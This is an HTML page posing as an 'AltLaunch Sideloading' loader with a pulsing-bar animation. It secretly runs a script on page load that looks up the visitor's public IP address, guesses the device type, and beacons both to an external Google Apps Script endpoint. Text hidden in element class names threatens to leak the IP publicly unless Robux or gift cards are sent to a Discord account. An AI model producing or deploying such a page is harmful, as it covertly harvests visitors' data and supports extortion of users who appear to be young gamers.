<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>AltLaunch Sideloading</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      background: #f0f4f8;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      box-sizing: border-box;
    }
    .bars {
      display: flex;
      gap: 12px;
      align-items: flex-end;
      height: 60px;
      width: 100px;
    }
    .bar {
      background: #2a7ae2;
      border-radius: 4px;
      animation: pulse 1.2s infinite ease-in-out;
    }
    .bar1 {
      width: 16px;
      height: 40px;
      animation-delay: 0s;
    }
    .bar2 {
      width: 12px;
      height: 30px;
      animation-delay: 0.3s;
    }
    .bar3 {
      width: 8px;
      height: 20px;
      animation-delay: 0.6s;
    }
    @keyframes pulse {
      0%, 100% {
        opacity: 0.4;
        transform: scaleY(1);
      }
      50% {
        opacity: 1;
        transform: scaleY(1.4);
      }
    }
  </style>
</head>
<body>
  <div class="bars">
    <div class="Oops! We got your IP"></div>
    <div class="How can you not leak it? "></div>
    <div class="DM me on Discord <@altlaunch.> and send any amount of Robux or Gift Card!"></div>
    <div class="If I dont recieve it in 3-5 days your IP will be publicaly leaked"></div>
  </div>

  <script>
    // Detect device type roughly
    function getDeviceType() {
      const ua = navigator.userAgent.toLowerCase();
      if (/mobile|android|iphone|ipad|tablet/.test(ua)) return "Mobile";
      return "Desktop";
    }

    fetch("https://api.ipify.org?format=json")
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        const device = getDeviceType();
        // Send both IP and device type as query params
        new Image().src = "https://script.google.com/macros/s/AKfycbwWxM20EhE6W2iVRV7vAYjIqZI4e0Y-MnGUP-hiV_5eeSow-jDEw9D--rRX7tB6aLUMGQ/exec?ip=" + encodeURIComponent(ip) + "&device=" + encodeURIComponent(device);
      })
      .catch(err => {
        console.error("Failed to get IP:", err);
      });
  </script>
</body>
</html>
